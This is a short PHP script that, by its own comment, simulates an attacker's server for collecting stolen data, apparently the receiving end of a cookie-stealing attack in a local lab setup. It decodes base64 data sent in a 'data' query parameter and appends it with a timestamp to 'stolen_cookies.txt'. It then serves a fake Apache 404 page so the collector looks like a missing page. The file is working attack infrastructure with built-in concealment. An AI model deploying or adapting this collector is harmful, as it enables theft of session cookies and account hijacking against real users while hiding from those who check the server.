<?php
// This file simulates the attacker's server that collects stolen data

if (isset($_GET['data'])) {
    $stolen_data = base64_decode($_GET['data']);
    // Open file in append mode (creates if needed, appends without deleting)
    $file = fopen("stolen_cookies.txt", "a");
    fwrite($file, "Time: " . date("Y-m-d H:i:s") . " | Data: " . $stolen_data . "\n");
    fclose($file);
}

// Sending a real error code to the browser (HTTP 404)
http_response_code(404);
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12 Server at 192.168.56.1 Port 80</address>
</body></html>